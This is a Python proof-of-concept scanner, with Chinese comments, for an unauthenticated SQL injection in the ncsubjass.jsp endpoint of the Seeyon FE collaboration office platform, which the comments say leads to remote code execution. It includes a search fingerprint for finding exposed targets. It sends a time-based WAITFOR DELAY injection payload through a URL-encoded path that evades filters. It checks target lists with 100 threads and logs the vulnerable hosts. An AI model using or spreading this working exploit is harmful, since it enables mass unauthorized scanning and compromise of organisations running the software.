#致远互联FE协作办公平台 ncsubjass SQL注入致RCE漏洞复现
#致远互联FE协作办公平台 ncsubiass.jsp接口处存在 SQL注入漏洞,未经身份验证的攻击者可以通过此漏洞获取数据库敏感信息，深入利用可获取服务器权限。
#body="li_plugins_download"
import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              致远互联FE协作办公平台 ncsubjass SQL注入致RCE漏洞░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="致远互联FE协作办公平台 ncsubjass SQL注入致RCE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = '/fenc/ncsubjass.j%73p'
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded',
    }
    data = "subjcode=';WAITFOR DELAY '0:0:5'--"
    try:
        res1 = requests.get(target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
            res3 = requests.post(url=url,headers=headers,verify=False,timeout=5)
            time1 = res2.elapsed.total_seconds()
            time2 = res3.elapsed.total_seconds()
            # print(time1,time2)
            if time1 - time2 >= 5:
                print(f"{BLUE}[+]该{target}存在漏洞{RESET}")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
        else:
            print(f"[-]该{target}不存在漏洞")
            return False
    except Exception as e:
        print(f"[*]该url存在问题{target}"+str(e))
        return False

if __name__ == '__main__':
    main()
